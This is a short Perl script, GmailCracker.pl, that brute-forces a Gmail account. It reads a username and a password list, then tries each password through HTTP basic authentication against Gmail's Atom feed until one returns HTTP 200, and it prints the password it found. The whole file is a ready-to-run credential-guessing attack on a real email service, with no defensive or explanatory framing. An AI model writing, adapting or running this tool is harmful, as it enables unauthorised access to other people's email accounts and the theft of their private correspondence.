#!/usr/bin/perl

use strict;
use warnings;

use WWW::Curl::Easy;

my($UserName, $Password, $Site, $CurlReturn, $File, $ResponseCode, $Curl, $NumOfArgs);

my(@Curl);

        $NumOfArgs = $#ARGV + 1;

        if( $NumOfArgs != 2 ) {

                print "\nUSAGE: GmailCracker.pl USERNAME PASSWD_LIST\n\n";

                exit;

        }

        $UserName = $ARGV[0];

        $File = $ARGV[1];

open(FILE, '<', $File) or die "Cannot open $File: $!\n";

        $Site = 'https://mail.google.com/mail/feed/atom';

        $Curl = WWW::Curl::Easy->new;

while(<FILE>) {

        $Curl->setopt(CURLOPT_TIMEOUT, 20);

        $Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);

        $Curl->setopt(CURLOPT_VERBOSE, 1);

        #$Curl->setopt(CURLOPT_HEADER, 1);

        $Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");

        $Curl->setopt(CURLOPT_URL, $Site);

        $CurlReturn = $Curl->perform;

        $ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);


        if( $ResponseCode == 200 ) {

                print "\n\nPASSWORD WAS $_\n\n";

                exit;

        }

                else {

                        print "\n\nPASSWORD WAS NOT $_\n\n";

                }

}
